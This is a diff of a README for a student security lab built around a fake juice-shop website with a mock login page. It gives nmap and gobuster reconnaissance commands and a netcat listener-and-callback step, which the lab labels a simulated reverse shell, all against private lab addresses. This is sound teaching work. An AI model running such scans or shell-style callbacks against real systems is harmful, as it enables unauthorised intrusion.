@@ -27,10 +27,7 @@ freshjuice-hub-lab/
 ├── malware.zip (Safe ZIP for demo)
 └── malware.txt (Explains malware behaviour)
 
-yaml
-Copy code
 
----
 
 # 🎓 1. Overview for Students
 
@@ -53,7 +50,7 @@ In this lab, you will learn:
 ## **Step 1 — Download the Lab**
 
 ### Option A (Recommended)
-```bash
+
 git clone https://github.com/marufrigan/freshjuice-hub-lab.git
 Option B
 Click Code → Download ZIP
@@ -61,24 +58,21 @@ Click Code → Download ZIP
 Extract the ZIP
 
 Step 2 — Enter the Project Folder
-bash
-Copy code
+
 cd freshjuice-hub-lab
 Step 3 — Start the Local Web Server
+
 Windows / Mac / Linux:
-bash
-Copy code
+
 python3 -m http.server 8080
 If Python is installed as python:
 
-bash
-Copy code
+
 python -m http.server 8080
 Step 4 — Open Website in Your Browser
 Visit:
 
-arduino
-Copy code
+
 http://localhost:8080
 You should now see the FreshJuice Hub fake website.
 
@@ -111,8 +105,7 @@ Would an average user trust it?
 🧪 Task 2: Analyze the Fake Login Page
 Enter test credentials such as:
 
-bash
-Copy code
+
 test@example.com
 password123
 Discuss:
@@ -141,42 +134,30 @@ Find the victim machine IP:
 
 Windows
 cmd
-Copy code
 ipconfig
 Mac/Linux
-bash
-Copy code
+
 ifconfig
 Example:
 
-Copy code
 192.168.1.150
 🛠 Task 4 — Nmap Scan
 From Kali:
 
-bash
-Copy code
+
 nmap -sV -sC -p 8080 192.168.1.150
 Answer:
-
 What service is running?
-
 What version of Python is detected?
-
 What ports are open?
 
 🛠 Task 5 — Directory Enumeration (Gobuster)
-bash
-Copy code
+
 gobuster dir -u http://192.168.1.150:8080 -w /usr/share/wordlists/dirb/common.txt
 Find:
-
 Hidden pages
-
 Sensitive files
-
 Developer paths
-
 Explain why directory enumeration is dangerous for real companies.
 
 🕵️‍♂️ 5. Part C — Safe Reverse-Shell Callback Simulation
@@ -184,24 +165,18 @@ This simulation demonstrates how malware communicates with attackers.
 No real malware is used.
 
 👨‍💻 On Kali (Attacker): Start Listener
-bash
-Copy code
+
 nc -lvp 4444
 👨‍🎓 Simulate the “malware callback”
 Open a new terminal in Kali:
 
-bash
-Copy code
 nc <kali-ip> 4444
 Example:
 
-bash
-Copy code
 nc 192.168.1.97 4444
 Now type:
 
-bash
-Copy code
+
 hello
 whoami
 ls
